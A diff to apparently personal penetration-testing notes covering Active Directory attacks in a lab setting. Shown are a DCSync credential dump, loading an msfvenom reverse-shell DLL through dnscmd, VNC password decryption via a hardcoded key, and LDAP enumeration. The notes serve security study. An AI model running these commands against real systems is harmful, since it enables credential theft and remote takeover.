@@ -820,3 +820,34 @@ lsadump::dcsync /user:testad\target-username
 dnscmd.exe RESOLUTE /config /serverlevelplugindll C:\temp\reverse_shell.dll
 #You can create the DLL with for example MSFVenom:
 msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=10.0.0.1 LPORT=1234 DLL=reverse_shell.dll > reverse_shell.dl
+
+#VNC passwd
+#Multiple different VNC solutions use the the same harcoded DES-key to store credentials, so if you manage to get the encrypted password from Windows registry
+#or from the /home/user/.vnc/passwd you can decrypt it with vncpasswd.py (https://github.com/trinitronx/vncpasswd.py), if you have the pass in hex (from registry)
+#you can do echo -en "1a2b3c4d5e6f7a8b" > passwdfile to convert
+python2.7 vncpasswd.py -d -f /home/kali/.vnc/passwd
+
+----
+
+#LDAP enumeration
+
+#DC functionality level:
+ldapsearch -LLL -x -H ldap://10.10.10.182 -b '' -s base '(objectClass=*)' | grep Functionality
+	domainFunctionality: 4
+	forestFunctionality: 4
+	domainControllerFunctionality: 4
+
+The functionality value can be checked against the following list (thanks to serverfault/jscott 
+https://serverfault.com/questions/512228/how-to-check-ad-ds-domain-forest-functional-level-from-domain-joined-workstation/512292#512292)
+to determine the server functionality level, so in our case it would be Windows Server 2008 R2.
+
+	Value  Forest        Domain             Domain Controller
+	0      2000          2000 Mixed/Native  2000
+	1      2003 Interim  2003 Interim       N/A
+	2      2003          2003               2003
+	3      2008          2008               2008
+	4      2008 R2       2008 R2            2008 R2
+	5      2012          2012               2012
+	6      2012 R2       2012 R2            2012 R2
+	7      2016          2016               2016
+
